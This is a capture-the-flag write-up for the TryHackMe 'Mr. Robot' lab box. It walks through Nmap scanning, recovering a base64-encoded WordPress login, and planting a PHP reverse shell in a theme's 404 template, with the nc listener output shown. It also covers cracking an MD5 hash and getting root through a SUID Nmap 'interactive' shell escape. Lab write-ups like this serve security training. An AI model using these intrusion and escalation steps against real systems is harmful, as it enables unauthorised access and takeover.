# THM - Mr. Robot CTF

#### Ip: 10.10.67.233
#### Name: Mr. Robot CTF
#### Rating: Medium

----------------------------------------------------------------------

robot.png

```text
Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?
```

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also user the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/THM/Mr_Robot_CTF]
└─$ sudo nmap -p-  --min-rate 10000 10.10.67.233
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-09 10:18 CDT
Nmap scan report for 10.10.67.233
Host is up (0.13s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds
```

Lets scan these ports using the `-sV` and `-sC` flags to enumerate versions and to use default Nmap scripts:

```text
┌──(ryan㉿kali)-[~/THM/Mr_Robot_CTF]
└─$ sudo nmap -sC -sV -T4 10.10.67.233 -p 22,80,443
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-09 10:19 CDT
Nmap scan report for 10.10.67.233
Host is up (0.12s latency).

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds
```

Interesting that SSH is being returned as closed here.

Checking out the site we find an interactive page:

site.png

Trying out `robots.txt` we find a couple entries:

robots.png

Heading to http://10.10.67.233/key-1-of-3.txt we find the first flag:

key1.png

We can also download the file fsociety.dic, which appears to be a wordlist:

```text
┌──(ryan㉿kali)-[~/THM/Mr_Robot_CTF]
└─$ head fsocity.dic
true
false
wikia
from
the
now
Wikia
extensions
scss
window
```

If we scan for more directories, we're tipped of that we're dealing with WordPress here.

ferox.png

Feroxbouster also finds a `/license` directory:

license.png

and if we scroll down we find the text:

```text
do you want a password or something?

ZWxsaW90OkVSMjgtMDY1Mgo=
```

This looks like base64, which we can decode in the terminal:

```text
┌──(ryan㉿kali)-[~/THM/Mr_Robot_CTF]
└─$ echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
elliot:ER28-0652
```
Nice! We have some credentials. Lets use these to login to the WordPress site:

login.png

### Exploitation

Once logged in we can navigate to Appearance > Themes, and from there we can copy in a PHP reverse shell into the 404 template:

404.png

Saving that and navigating to http://10.10.67.233/404.php we catch a reverse shell back:

```text
┌──(ryan㉿kali)-[~/THM/Mr_Robot_CTF]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.6.61.45] from (UNKNOWN) [10.10.67.233] 44433
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 15:47:17 up 33 min,  0 users,  load average: 0.00, 0.02, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
$ hostname
linux
$ python3 -c 'import pty;pty.spawn("/bin/bash")'

daemon@linux:/$
```

Trying to grab the second key from the `robot` directory we get a permission denied:

```text
daemon@linux:/home$ ls
robot
daemon@linux:/home$ cd robot
daemon@linux:/home/robot$ ls
key-2-of-3.txt	password.raw-md5
daemon@linux:/home/robot$ cat key-2-of-3.txt 
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

But we did find a potential password. Lets crack that using crackstation:

crack.png

Cool, we can now use the `su robot` command and grab the second key:

key2.png

### Privilige Escalation

Lets transfer LinPEAS over to the target to help with enumeration:

transfer.png

LinPEAS finds that the SUID bit is set for Nmap. This should make for an easy privesc:

suid.png

Lets head over to https://gtfobins.github.io/ and search for Nmap:

gtfo.png

Cool, this should work for us:

```text
robot@linux:/tmp$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami
root
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

All that's left to do is grab the final key:

key3.png

Thanks for following along!

-Ryan

-----------------------------------------------------------------------------
